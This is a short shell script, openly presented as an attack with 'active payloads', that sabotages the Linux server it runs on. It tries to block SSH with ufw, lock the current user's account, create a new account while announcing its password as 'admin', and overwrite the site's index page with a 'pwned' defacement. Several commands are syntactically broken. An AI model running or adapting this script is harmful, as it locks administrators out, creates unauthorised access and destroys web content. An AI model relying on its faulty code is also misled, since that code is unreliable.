#!/bin/sh


#------------------------Warning: active payloads-------------------------------------------------
# port blocker
# webpage destroyer
# Password changer
# ftp infector
# overall bad day creator

# THIS SCRIPT WILL SERIOUSLY MESS UP YOUR SERVER
# I'M NOT RESPONSIBLE IF YOU RUN THIS ON YOUR SERVER OR SOMEONE ELSE USES THIS ON YOU

#Author: Brandon Sargent
#

echo "--------------------------------BEGINING ATTACK---------------------------------"

echo "------------------------------BLOCKING PORT 22 (SSH)----------------------------"

echo ""
ufw block 22/all
sleep 2
echo "-----------------------------------DONE------------------------------------------"

echo ""
echo "----------------------------LOCKING CURRENT ACCOUNT----------------------------"

echo""

usermod -L $USER

sleep 4

echo"--------------------------------------DONE----------------------------------------"

echo""

echo"-----------------------------ADD NEW ACCOUNT TO SERVER-----------------------------"

echo""

echo"Enter new username"
read username

useradd -m $username -p 

sleep 2

echo"New user"
echo  $username 
echo"with password"
echo"admin"
echo"created"

echo"----------------------------------NEW ACCOUNT CREATED-------------------------------"
echo""
echo"----------------------------------DISMEMBERING WEBPAGE------------------------------"
echo"<!DOCTYPE html>"> /var/www/html/index.html
echo"<html><head><title>^&HSD's website</title></head>">> /var/www/html/index.html
echo"<body><h1>W3lc0m3 t0 j4ck's W3bs1t3</h1>" >>/var/www/html/index.html
echo"<p>This website has been pwned by 3^*#@dsa32</P></html>" >>/var/www/html/kindex.html
